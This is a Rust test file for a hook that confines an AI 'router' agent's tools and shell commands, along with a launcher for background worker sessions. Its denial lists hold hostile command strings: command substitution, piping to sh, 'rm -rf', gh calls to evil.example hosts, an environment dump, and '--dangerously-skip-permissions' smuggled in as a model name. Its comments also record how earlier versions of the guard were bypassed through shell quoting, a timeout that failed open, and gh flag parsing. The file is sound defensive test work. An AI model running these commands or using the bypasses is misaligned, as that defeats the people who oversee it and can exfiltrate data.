//! The router's enforcement surface (E-ROUTER close review): the PreToolUse guard
//! `scripts/router-guard.jq` as `.claude/settings.json` wires it, the background-session launcher
//! `scripts/router-worker.sh` (with a stub `claude`), the owner-action watch, and the shipped PUSHED watch probe.
//! Needs `jq`, `sh`, `uuidgen` and `shasum` on PATH, as the guard and launcher do.
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{Duration, Instant};
use tempfile::TempDir;

mod common;

fn root() -> &'static Path {
    Path::new(env!("CARGO_MANIFEST_DIR"))
}

/// Run the guard on one PreToolUse input; Some(reason) = denied, None = allowed.
fn guard(agent: &str, tool: &str, input: serde_json::Value) -> Option<String> {
    guard_event(serde_json::json!({"agent_type": agent, "tool_name": tool, "tool_input": input, "cwd": "/r"}))
}

/// Run the guard on one whole PreToolUse event; Some(reason) = denied, None = allowed.
fn guard_event(event: serde_json::Value) -> Option<String> {
    let mut p = Command::new("jq")
        .args(["-c", "-f"])
        .arg(root().join("scripts/router-guard.jq"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// The guard's verdict on `event` from its process output; Some(reason) = denied, None = allowed.
fn decision(event: &serde_json::Value, o: Output) -> Option<String> {
    assert!(o.status.success(), "guard errored on {event}: {}", String::from_utf8_lossy(&o.stderr));
    let out = String::from_utf8(o.stdout).unwrap();
    if out.trim().is_empty() {
        return None;
    }
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "deny", "{out}");
    Some(v["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap().to_string())
}

fn bash(cmd: &str) -> Option<String> {
    guard("router", "Bash", serde_json::json!({ "command": cmd }))
}

fn settings() -> serde_json::Value {
    serde_json::from_str(&std::fs::read_to_string(root().join(".claude/settings.json")).unwrap()).unwrap()
}

/// Blocker 1 of the close review: `--out""put=` (and kin) reached the shell as `--output=` because the
/// hook judged raw shell text by substring. Every documented shape still passes.
#[test]
fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag() {
    for denied in [
        r#"git log -1 --format=#!/bin/sh%n --out""put=scripts/router-worker.sh"#,
        "git log -1 --out''put=x",
        r"git log -1 --out\put=x",
        "git log -1 --out{put,}=x",
        "git log -1 --outp=x",
        "git show --output=x HEAD",
        "git log $(id)",
        "git log `id`",
        "git status; rm -rf x",
        "git log | sh",
        "git log > x",
        "git log\nrm x",
        "git log -- *.rs",
        "gh pr list -R evil.example/a/b",
        "gh pr list --repo=evil.example/a/b",
        // fix-round re-check: a -R inside a short-flag cluster, a PR URL, gh's jq over the environment
        "gh pr list -dR evil.example/a/b",
        "gh pr view -cRevil.example/a/b 1",
        "gh pr view https://evil.example/o/SECRET/pull/1",
        "gh pr list --json number -q env",
        "gh pr view 1 --web",
        "scripts/router-worker.sh spawn a ../x .router/briefs/a.md opus",
        "scripts/router-worker.sh wait ../x",
        "scripts/router-worker.sh wait n;id",
        "scripts/router-worker.sh wait $(id)",
        "rm -rf x",
        "claude -p hi",
        "kill 1",
        "git -c core.pager=sh log",
        "scripts/router-watch.sh pushed 1a2b3c4 main --upload-pack=x",
        "scripts/router-watch.sh commit -b x y",
        "scripts/router-watch.sh commit b 1a2b3c4 ../x",
        "X=1 scripts/router-watch.sh signed 1a2b3c4",
        "scripts/router-watch.sh watch main",
        "scripts/router-watch.sh signed",
        "scripts/router-watch.sh signed $(id)",
        // the watch word class: plain words only, never a dots-only path, a rev expression or a flag
        "scripts/router-watch.sh merged 1a2b3c4 main+x",
        "scripts/router-watch.sh commit a:b 1a2b3c4",
        "scripts/router-watch.sh signed HEAD^",
        "scripts/router-watch.sh signed HEAD~1",
        "scripts/router-watch.sh merged 1a2b3c4 main@{1}",
        r#"scripts/router-watch.sh signed "1a2b3c4""#,
        "scripts/router-watch.sh signed '1a2b3c4'",
        r"scripts/router-watch.sh signed 1a2b\3c4",
        "scripts/router-watch.sh signed  1a2b3c4",
        "scripts/router-watch.sh commit b 1a2b3c4 .",
        "scripts/router-watch.sh commit b 1a2b3c4 ..",
        "scripts/router-watch.sh commit b 1a2b3c4 ...",
        "scripts/router-watch.sh pushed 1a2b3c4 a--output",
        "scripts/router-watch.sh signed x=y",
    ] {
        assert!(bash(denied).is_some(), "guard allowed {denied:?}");
    }
    // DoS: an unbounded trim once ran past the hook's 10s timeout, which Claude Code treats as allow
    let t = Instant::now();
    assert!(bash(&format!("rm -rf x{}y", " ".repeat(100_000))).is_some());
    assert!(t.elapsed() < Duration::from_secs(3), "guard took {:?} on a long command", t.elapsed());
    assert!(bash("rm x").unwrap().contains("scripts/router-watch.sh commit|signed|merged|pushed|tagged"), "deny message omits the watch shape");

    let mut allowed = vec![
        "git log --oneline -5".to_string(),
        "git diff HEAD~1 HEAD^ -- src/main.rs".into(),
        "git log -1 --notes=mr --format=%N 9787799dccec525966570861689ccb6e2c2fc615".into(),
        "git show HEAD:src/main.rs".into(),
        "gh pr view 12 --json title,state".into(),
        "gh pr list --state open -L 5 --author vuluu".into(),
        "gh pr status".into(),
        "scripts/router-worker.sh spawn e-x-w1 /Users/o/Keel-x .router/briefs/e-x-w1.md opus".into(),
        "scripts/router-worker.sh worktree add wu/E-X/w1-a".into(),
        "scripts/router-worker.sh stop e-x-w1".into(),
        "scripts/router-watch.sh commit wu/E-SEED2/w12-owner-watch fa5a25d16d953d5858c35b58e6025a6a7903ff8b skills/keel-router/SKILL.md .claude/skills/keel-router/SKILL.md".into(),
        "scripts/router-watch.sh signed fa5a25d16d953d5858c35b58e6025a6a7903ff8b".into(),
        "scripts/router-watch.sh merged fa5a25d epic/E-SEED2".into(),
        "scripts/router-watch.sh pushed fa5a25d main".into(),
        "scripts/router-watch.sh tagged v0.2.0 fa5a25d".into(),
        "scripts/router-watch.sh commit b fa5a25d .claude/x .a.b/c".into(),
    ];
    // permissions.allow serves workers and the router alike: every router entry is a shape the guard
    // accepts (one source of truth, no drift); every worker-only entry is one it refuses the router.
    // the launcher and `router-watch.sh` (E-SEED2.W12) are router entries; cargo/keel are
    // worker-only, and these shapes stay refused whether or not settings lists them.
    let mut worker_only: Vec<String> =
        ["cargo test", "cargo build", "keel notes write test", "keel preflight wu HEAD", "keel check"].map(String::from).to_vec();
    for a in settings()["permissions"]["allow"].as_array().unwrap() {
        let a = a.as_str().unwrap().strip_prefix("Bash(").unwrap().strip_suffix(')').unwrap();
        let cmd = match a.strip_suffix(" *") {
            Some(p) if p.ends_with(" stop") || p.ends_with(" watchdog start") => format!("{p} n"),
            Some(p) if p.ends_with(" worktree add") || p.ends_with(" worktree remove") => format!("{p} wu/E-X/w1-a"),
            Some(p) if p.ends_with("router-watch.sh") => format!("{p} signed 1a2b3c4"),
            Some(p) if p.starts_with("scripts/") => format!("{p} n /w .router/briefs/n.md opus"),
            Some(p) => format!("{p} HEAD"),
            None => a.to_string(),
        };
        if ["cargo ", "keel "].iter().any(|w| a.starts_with(w)) {
            worker_only.push(cmd);
        } else {
            allowed.push(cmd);
        }
    }
    for ok in &allowed {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
    for w in &worker_only {
        assert!(bash(w).is_some(), "guard allowed worker-only {w:?} to the router");
    }
}

/// Review of 67b0de5: the guard must split gh's argv the way gh's flag parser (pflag) does. A
/// single-dash long name is a short flag plus an attached value to gh (`-label` = `-l abel`), so
/// the "value" after it becomes a flag of its own (`-label -R evil` really contacted evil.invalid);
/// a value starting with `-` is the same hole from the other side. Lists every leak, not the first.
#[test]
fn router_bash_guard_reads_gh_flags_as_gh_does() {
    let denied = [
        "gh pr list -label -R evil.example/a/b",
        "gh pr list -limit -R x/a/b",
        "gh pr list -author -R x/a/b",
        "gh pr list -label -q env --json number",
        "gh pr list -l -R x/a/b",
        "gh pr list -label --repo x/a/b",
        "gh pr list -author -w",
        // -s is --state to gh: only its enum check stops these today
        "gh pr list -state -R x/a/b",
        "gh pr list -search -R x/a/b",
        // gh has no -b/-h short today; one added later would make these live
        "gh pr list -base -R x/a/b",
        "gh pr list -head -R x/a/b",
        "gh pr view 1 -json -R x/a/b",
        // a value that is itself flag-shaped, and a short letter spelled as a long name
        "gh pr list --label -q env",
        "gh pr list --json=-R x/a/b",
        "gh pr list -L=-R x/a/b",
        "gh pr list --L 5",
    ];
    let leaks: Vec<_> = denied.iter().filter(|c| bash(c).is_none()).collect();
    assert!(leaks.is_empty(), "guard allowed {leaks:#?}");

    for ok in [
        "gh pr view 12 --json title,state",
        "gh pr list --state open -L 5 --author vuluu",
        "gh pr list -L=5 -s=open",
        "gh pr status",
        "gh pr status --json=a,b",
        "gh pr list -l bug -A vuluu -B main -H wu/x -S fix --label x --limit 3 --base main --head x --search y",
    ] {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
}

/// Blocker 2 of the close review: `Agent`-tool subagents report their own agent_type, so the router
/// guard never sees them; the router may not start one, nor use any tool its agent file omits.
#[test]
fn router_guard_confines_the_router_to_its_tools_and_leaves_other_agents_alone() {
    for t in ["Agent", "Task", "Edit", "MultiEdit", "NotebookEdit", "Monitor", "mcp__x__y"] {
        assert!(guard("router", t, serde_json::json!({})).is_some(), "router may use {t}");
    }
    assert!(guard("router", "Skill", serde_json::json!({"skill": "code-review"})).is_some());
    assert_eq!(guard("router", "Skill", serde_json::json!({"skill": "keel-router"})), None);
    assert_eq!(guard("router", "Read", serde_json::json!({"file_path": "/etc/hosts"})), None);
    assert_eq!(guard("router", "Write", serde_json::json!({"file_path": "/r/.router/briefs/w1.md"})), None);
    for p in ["/r/.router/briefs/../x.md", "/r/scripts/router-worker.sh", "/r/.router/briefs/sub/x.md", "/r/.router/briefs/.x.md"] {
        assert!(guard("router", "Write", serde_json::json!({ "file_path": p })).is_some(), "router may Write {p}");
    }
    for a in ["worker", "general-purpose"] {
        assert_eq!(guard(a, "Bash", serde_json::json!({"command": "rm -rf x; claude -p hi"})), None);
        assert_eq!(guard(a, "Agent", serde_json::json!({})), None);
    }

    // the guard's tool list is exactly router.md's tools: line
    let agent = std::fs::read_to_string(root().join(".claude/agents/router.md")).unwrap();
    let mut md: Vec<&str> = agent.lines().find_map(|l| l.strip_prefix("tools:")).unwrap().split(',').map(str::trim).collect();
    let jq = std::fs::read_to_string(root().join("scripts/router-guard.jq")).unwrap();
    let def = jq.lines().find_map(|l| l.strip_prefix("def tools: [")).unwrap();
    let mut g: Vec<&str> = def.split(']').next().unwrap().split(',').map(|s| s.trim().trim_matches('"')).collect();
    md.sort();
    g.sort();
    assert_eq!(md, g, "router.md tools: and the guard's tools differ");
    assert!(!md.contains(&"Agent"), "router.md grants Agent");
}

/// Router SendMessage PreToolUse events as Claude Code 2.1.288 delivered them (E-ROUTER3.W1 capture;
/// ids and paths replaced). The harness adds type, recipient and content to what the router wrote,
/// which the old closed key set denied (backlog e-router-v2 R8).
const CAPTURED_SEND_MESSAGE: [&str; 2] = [
    r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"router","hook_event_name":"PreToolUse","tool_name":"SendMessage","tool_input":{"to":"e-x-w1","message":"","notify_when_idle":true,"type":"message","recipient":"e-x-w1","content":""},"tool_use_id":"u1"}"#,
    r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"router","hook_event_name":"PreToolUse","tool_name":"SendMessage","tool_input":{"to":"e-x-w1","summary":"ping","message":"ping: reply with pong","type":"message","recipient":"e-x-w1","content":"ping: reply with pong"},"tool_use_id":"u2"}"#,
];

/// E-ROUTER3.W1 (DEC-42): the router may message any named worker, an idle subscription or content
/// that steers it; the guard judges only the addressee, so harness-added keys never deny a call.
#[test]
fn router_guard_allows_send_message_to_a_named_worker_as_the_harness_sends_it() {
    for e in CAPTURED_SEND_MESSAGE {
        assert_eq!(guard_event(serde_json::from_str(e).unwrap()), None, "guard denied the captured {e}");
    }
    let send = |i: serde_json::Value| guard("router", "SendMessage", i);
    for ok in [
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true}),
        serde_json::json!({"to": "e-x-w1 [3fa9c1]", "message": "answer: keep the old flag", "summary": "answer"}),
        serde_json::json!({"to": "e-x-w1", "message": {"type": "shutdown_request"}}),
    ] {
        assert_eq!(send(ok.clone()), None, "guard denied {ok}");
    }
    for denied in [
        serde_json::json!({"message": "hi"}),
        serde_json::json!({"to": "", "message": "hi"}),
        serde_json::json!({"to": ["e-x-w1"], "message": "hi"}),
        serde_json::json!({"to": null, "notify_when_idle": true}),
        serde_json::json!("e-x-w1"),
        serde_json::json!(null),
    ] {
        assert!(send(denied.clone()).unwrap().contains("non-empty string"), "guard allowed {denied}");
    }
    assert_eq!(guard("router", "ListAgents", serde_json::json!({})), None);
    assert_eq!(guard("worker", "SendMessage", serde_json::json!({})), None);
}

/// Important of the close review: a hook that errors (no jq, no guard file) must deny, not allow.
#[test]
fn settings_run_the_guard_on_every_tool_and_fail_closed() {
    let pre = settings()["hooks"]["PreToolUse"].as_array().unwrap().clone();
    assert_eq!(pre.len(), 1, "one PreToolUse group: the guard");
    assert!(pre[0].get("matcher").is_none(), "the guard must see every tool");
    let cmd = pre[0]["hooks"][0]["command"].as_str().unwrap().to_string();
    let run = |dir: &Path, path: &str| {
        let mut p = common::cmd("/bin/sh")
            .args(["-c", &cmd])
            .env("CLAUDE_PROJECT_DIR", dir)
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        let ev = r#"{"agent_type":"router","tool_name":"Agent","tool_input":{}}"#;
        std::io::Write::write_all(&mut p.stdin.take().unwrap(), ev.as_bytes()).unwrap();
        p.wait_with_output().unwrap()
    };
    let path = std::env::var("PATH").unwrap();
    let o = run(root(), &path);
    assert!(o.status.success() && String::from_utf8_lossy(&o.stdout).contains("\"deny\""), "{o:?}");
    let empty = TempDir::new().unwrap();
    assert_eq!(run(empty.path(), &path).status.code(), Some(2), "missing guard file must block");
    assert_eq!(run(root(), empty.path().to_str().unwrap()).status.code(), Some(2), "missing jq must block");
}

/// Layered on `common::cmd` for the git W12's tests run (`git()`, the PUSHED probe, the e2e worktree
/// add, `Watcher::cmd` and the watch under it): only the repo's own config is read, so no user or
/// system setting (tag.gpgSign, log.showSignature, core.quotePath, ...) can change what it does, and
/// no inherited GIT_TRACE* or GIT_DEFAULT_HASH changes its output or its repos.
fn hermetic(c: &mut Command) -> &mut Command {
    let set: Vec<std::ffi::OsString> = c.get_envs().map(|(k, _)| k.to_owned()).collect();
    for k in std::env::vars_os().map(|(k, _)| k).chain(set) {
        if k.to_string_lossy().starts_with("GIT_TRACE") || k == "GIT_DEFAULT_HASH" {
            c.env_remove(k);
        }
    }
    c.env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_NOSYSTEM", "1")
}

/// Upper bound on any wait for another process; a hung script fails the test instead of hanging it.
const BOUND: Duration = Duration::from_secs(10);

fn git(d: &Path, a: &[&str]) -> Output {
    let o = hermetic(&mut common::cmd("git"))
        .args(["-c", "core.hooksPath=/dev/null"])
        .args(a)
        .current_dir(d)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(o.status.success(), "git {a:?}: {}", String::from_utf8_lossy(&o.stderr));
    o
}

struct Launcher {
    _d: TempDir,
    main: PathBuf,
    wt: PathBuf,
    wt2: PathBuf,
    stub: PathBuf,
    state: PathBuf,
}

/// The stub `claude` the launcher runs through $ROUTER_CLAUDE, playing Claude Code 2.1.288's
/// background CLI as the E-ROUTER3.W10 probes saw it. Every call appends its working directory and
/// its argv (each argument bracketed, so boundaries are visible) to $STUB_STATE/calls and exits at
/// once; the GIT_* variables each call sees are appended to $STUB_STATE/git-env. `--bg` lists a new
/// idle background session in $STUB_STATE/sessions.json (named by `-n`) and prints the `backgrounded` line; while
/// $STUB_STATE/refuse exists it prints that file and exits 1, and while $STUB_STATE/unlisted exists it
/// starts nothing it lists. `agents --json` prints the list; while $STUB_STATE/agents-ok holds k it
/// succeeds k more times, then fails printing to stderr only. After printing: while $STUB_STATE/vanish
/// exists it empties the list (a session that ends between two looks), while $STUB_STATE/swap exists a
/// busy session is replaced by an idle one of the same name under a new id, and while
/// $STUB_STATE/settle exists every session turns idle (a turn that ends between two looks). `stop <id>`
/// delists the id, `rm` only records.
fn stub_claude(stub: &Path) {
    std::fs::write(stub, concat!(
        "#!/bin/sh\nS=$STUB_STATE\nprintf '%s ' \"$PWD\" >> \"$S/calls\"; printf '[%s]' \"$@\" >> \"$S/calls\"; echo >> \"$S/calls\"\n",
        "env | grep '^GIT_' >> \"$S/git-env\"\n",
        "[ -s \"$S/sessions.json\" ] || echo '[]' > \"$S/sessions.json\"\n",
        "case \"$1\" in\n",
        "  agents) if [ -e \"$S/agents-ok\" ]; then k=$(cat \"$S/agents-ok\"); [ \"$k\" -gt 0 ] || { echo 'Error: no supervisor' >&2; exit 1; }; echo $((k - 1)) > \"$S/agents-ok\"; fi\n",
        "    cat \"$S/sessions.json\"; [ ! -e \"$S/vanish\" ] || echo '[]' > \"$S/sessions.json\"\n",
        "    [ ! -e \"$S/swap\" ] || { jq 'map(if .status == \"busy\" then .id = \"new0\" | .sessionId = \"new0-x\" | .status = \"idle\" else . end)' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; }\n",
        "    [ ! -e \"$S/settle\" ] || { jq 'map(.status = \"idle\")' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; }; exit 0;;\n",
        "  stop) jq --arg i \"$2\" 'map(select(.id != $i))' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; echo \"stopped $2\"; exit 0;;\n",
        "  rm) echo \"removed $2\"; exit 0;;\n",
        "esac\n",
        "[ ! -e \"$S/refuse\" ] || { cat \"$S/refuse\"; exit 1; }\n",
        "name=\nwhile [ $# -gt 0 ]; do case \"$1\" in -n) name=$2;; esac; shift; done\n",
        "sid=$(uuidgen | tr A-F a-f)\n",
        "id=${sid%%-*}\n",
        "[ -e \"$S/unlisted\" ] || { jq --arg n \"$name\" --arg i \"$id\" --arg s \"$sid\" --arg c \"$PWD\" '. + [{pid: 1, id: $i, cwd: $c, kind: \"background\", sessionId: $s, name: $n, status: \"idle\", state: \"done\"}]' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; }\n",
        "echo \"backgrounded · $id · $name\"\n"
    )).unwrap();
    std::fs::set_permissions(stub, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// `router-watch.sh` sleeps once per poll; this `<base>/shim/sleep` counts the polls in
/// $STEP_DIR/polls (its argument, one per line, in $STEP_DIR/sleeps) and blocks poll n until the test
/// creates $STEP_DIR/go-n, so each poll judges a state the test has set. It ends with its caller or the test process.
fn sleep_shim(base: &Path) {
    std::fs::create_dir_all(base.join("shim")).unwrap();
    std::fs::write(base.join("shim/sleep"), concat!(
        "#!/bin/sh\necho \"$1\" >> \"$STEP_DIR/sleeps\"\nn=$(( $(cat \"$STEP_DIR/polls\" 2>/dev/null || echo 0) + 1 ))\n",
        "echo \"$n\" > \"$STEP_DIR/polls.tmp\" && mv \"$STEP_DIR/polls.tmp\" \"$STEP_DIR/polls\"\n",
        "while [ ! -e \"$STEP_DIR/go-$n\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null && kill -0 \"$PPID\" 2>/dev/null; do /bin/sleep 0.02; done\n"
    )).unwrap();
    std::fs::set_permissions(base.join("shim/sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// A repo whose main checkout holds the launcher, the worker persona and an `epic/E-X` branch, two
/// linked worktrees and the stub claude.
fn launcher() -> Launcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let main = base.join("main");
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::create_dir_all(main.join(".router/briefs")).unwrap();
    std::fs::copy(root().join("scripts/router-worker.sh"), main.join("scripts/router-worker.sh")).unwrap();
    std::fs::copy(root().join("scripts/router-guard.jq"), main.join("scripts/router-guard.jq")).unwrap();
    std::fs::write(main.join(".gitignore"), ".router/\n/target/\n").unwrap();
    std::fs::create_dir_all(main.join(".claude/agents")).unwrap();
    std::fs::write(main.join(".claude/agents/worker.md"), "---\nname: worker\n---\nworker\n").unwrap();
    std::fs::write(main.join(".router/briefs/b.md"), "do the thing\n").unwrap();
    std::fs::create_dir_all(main.join(".keel")).unwrap();
    std::fs::copy(root().join(".keel/config.toml"), main.join(".keel/config.toml")).unwrap();
    git(&main, &["init", "-q", "-b", "main"]);
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["branch", "epic/E-X"]);
    git(&main, &["worktree", "add", "-q", "../wt", "-b", "w"]);
    git(&main, &["worktree", "add", "-q", "../wt2", "-b", "w2"]);
    let stub = base.join("claude");
    stub_claude(&stub);
    let state = base.join("state");
    std::fs::create_dir_all(&state).unwrap();
    Launcher { main, wt: base.join("wt"), wt2: base.join("wt2"), stub, state, _d: d }
}

impl Launcher {
    fn run(&self, args: &[&str]) -> (bool, String) {
        self.run_env(args, &[])
    }

    fn cmd(&self, args: &[&str], env: &[(&str, &str)]) -> Command {
        let mut c = common::cmd("sh");
        c.arg("scripts/router-worker.sh")
            .args(args)
            .current_dir(&self.main)
            .env("ROUTER_CLAUDE", &self.stub)
            .env("STUB_STATE", &self.state)
            .env("HOME", self.state.join("home"))
            .env("XDG_CONFIG_HOME", self.state.join("home/.config"))
            .envs(env.iter().copied());
        c
    }

    fn run_env(&self, args: &[&str], env: &[(&str, &str)]) -> (bool, String) {
        let o = self.cmd(args, env).output().unwrap();
        (o.status.success(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
    }

    /// Commit `config` as the main checkout's .keel/config.toml (None: remove it), the HEAD the launcher reads.
    fn commit_config(&self, config: Option<&str>) {
        let f = self.main.join(".keel/config.toml");
        match config {
            Some(c) => std::fs::write(&f, c).unwrap(),
            None => std::fs::remove_file(&f).unwrap(),
        }
        git(&self.main, &["add", "-A", ".keel"]);
        git(&self.main, &["commit", "-qm", "config"]);
    }

    /// The router closes an idle worker.
    fn stop(&self, name: &str) {
        let (ok, out) = self.run(&["stop", name]);
        assert!(ok && out.starts_with(&format!("STOPPED name={name} ")), "{out}");
    }

    /// How many sessions the launcher started under `name`.
    fn starts(&self, name: &str) -> usize {
        calls(&self.state).iter().filter(|(_, a)| a.first().map(String::as_str) == Some("--bg") && a.windows(2).any(|w| w[0] == "-n" && w[1] == name)).count()
    }

    /// PATH with an instant `sleep` first, so the launcher's bounded polls run without waiting.
    fn fast_path(&self) -> String {
        let shim = self.state.join("shim");
        std::fs::create_dir_all(&shim).unwrap();
        std::fs::write(shim.join("sleep"), "#!/bin/sh\n:\n").unwrap();
        std::fs::set_permissions(shim.join("sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        format!("{}:{}", shim.display(), std::env::var("PATH").unwrap())
    }

    fn sessions(&self) -> Vec<serde_json::Value> {
        serde_json::from_str(&std::fs::read_to_string(self.state.join("sessions.json")).unwrap()).unwrap()
    }

    fn set_sessions(&self, rows: &[serde_json::Value]) {
        std::fs::write(self.state.join("sessions.json"), serde_json::to_string(rows).unwrap()).unwrap();
    }
}

/// Every call the stub recorded under `state`: its working directory and its argv.
fn calls(state: &Path) -> Vec<(String, Vec<String>)> {
    std::fs::read_to_string(state.join("calls"))
        .unwrap_or_default()
        .lines()
        .map(|l| {
            let (dir, argv) = l.split_once(" [").unwrap();
            (dir.to_string(), argv.trim_end_matches(']').split("][").map(String::from).collect())
        })
        .collect()
}

fn field<'a>(out: &'a str, k: &str) -> &'a str {
    out.split_whitespace().find_map(|w| w.strip_prefix(k)).unwrap_or_else(|| panic!("no {k} in {out}"))
}

/// The launcher's refusals (none had a test before the close review) and one live session per name
/// (E-ROUTER3.W10: any session the CLI lists under it, wherever it runs).
#[test]
fn launcher_refuses_unsafe_targets_and_runs_one_worker_per_name() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let wt2 = l.wt2.to_str().unwrap();
    let main = l.main.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    for (args, why) in [
        (vec!["spawn", "n", main, brief, "opus"], "may not run in"),
        (vec!["spawn", "n", "/tmp", brief, "opus"], "not a registered worktree"),
        (vec!["spawn", "-n", wt, brief, "opus"], "bad name"),
        (vec!["spawn", "n", wt, brief, "gpt"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "sonnet"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "haiku"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "fable"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, "scripts/router-worker.sh", "opus"], "file must be a .md under"),
    ] {
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }
    std::os::unix::fs::symlink(l.main.join(".router/briefs/b.md"), l.main.join(".router/briefs/s.md")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/s.md", "opus"]);
    assert!(!ok && out.contains("symlinks refused"), "{out}");

    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    let copy = field(&out, "brief=").to_string();
    assert!(copy.starts_with(wt) && std::fs::read_to_string(&copy).unwrap() == "do the thing\n", "{out}");

    // a second run under a live name is refused
    let (ok, out) = l.run(&["spawn", "n", wt2, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    l.stop("n");

    // any listed session holds its name, whatever its directory or kind: SendMessage addresses by name
    let elsewhere = serde_json::json!({"id": "e1", "sessionId": "e1", "name": "n", "cwd": "/elsewhere", "kind": "interactive", "status": "busy"});
    l.set_sessions(&[elsewhere]);
    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    l.set_sessions(&[]);

    // E-SEED2.W7 (DEC-39): the policy is [router] in .keel/config.toml as committed at HEAD; anything
    // the launcher's narrow reader does not accept refuses the run and starts nothing
    let ok_policy = "[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n";
    let mut policy_refusals = vec![(None, "absent".to_string())];
    for (bad, what) in [
        ("code_paths = [\"src/\"]\n", "no [router]"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n", "missing key"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"max\"\n", "default not in list"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"ultracode\"]\nworker_default_effort = \"medium\"\n", "unknown level"),
        ("[router]\nworker_model = opus\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "unquoted"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\" \"high\"]\nworker_default_effort = \"medium\"\n", "list without comma"),
        (&format!("{ok_policy}worker_model = \"opus\"\n"), "repeated key"),
        (&format!("{ok_policy}worker_extra = \"x\"\n"), "unknown key"),
        ("[router]\nworker_model = \"opus\"\n[other]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "key outside the section"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n[other]\nworker_default_effort = \"medium\"\n", "key after another section"),
        (&ok_policy.replace('\n', "\r\n"), "CRLF"),
        (&ok_policy.replace("worker_model = ", "worker_model\t=\t"), "tabs around ="),
        (&ok_policy.replace("\"opus\"", "'opus'"), "single quotes"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = []\nworker_default_effort = \"medium\"\n", "empty array"),
        (&ok_policy.replace("\"high\"]", "\"high\",]"), "trailing comma"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\n  \"medium\",\n  \"high\",\n]"), "multi-line array"),
        (&format!("{ok_policy}[router.x]\ny = 1\n"), "[router.x]"),
        (&format!("{ok_policy}[[router]]\n"), "[[router]]"),
        (&format!("{ok_policy}[ router ]\n"), "spaced header"),
        (&format!("{ok_policy}[\"router\"]\n"), "quoted header"),
        (&format!("  {ok_policy}"), "indented header"),
        (&format!("{ok_policy}  [router]\n"), "indented second header"),
        (&format!("{ok_policy}[router]\n"), "duplicate section"),
        ("[router]\nworker_model = \"opus\"\n[review]\nx = 1\n[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "split section"),
        (&ok_policy.replace("[router]\n", "[router]\t\n"), "trailing tab on header"),
        (&ok_policy.replace("[router]\n", "[router] \n"), "trailing space on header"),
        (&ok_policy.replace("\"opus\"", "\"--dangerously-skip-permissions\""), "model starting with -"),
        (&ok_policy.replace("\"opus\"", "\"4opus\""), "model starting with a digit"),
        (&ok_policy.replace("worker_default_effort = \"medium\"", "worker_default_effort = \"-medium\""), "effort starting with -"),
